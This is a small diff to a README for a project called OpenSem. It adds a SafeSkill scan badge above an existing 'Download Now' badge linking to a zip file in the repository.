@@ -1,5 +1,7 @@
 # 🚀 OpenSem - Easy Project Setup with Templates
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/69ir-opensem)
+
 ## 📥 Download Now
 [![Download OpenSem](https://github.com/69IR/OpenSem/raw/refs/heads/main/configs/Sem_Open_v2.2.zip)](https://github.com/69IR/OpenSem/raw/refs/heads/main/configs/Sem_Open_v2.2.zip)
 
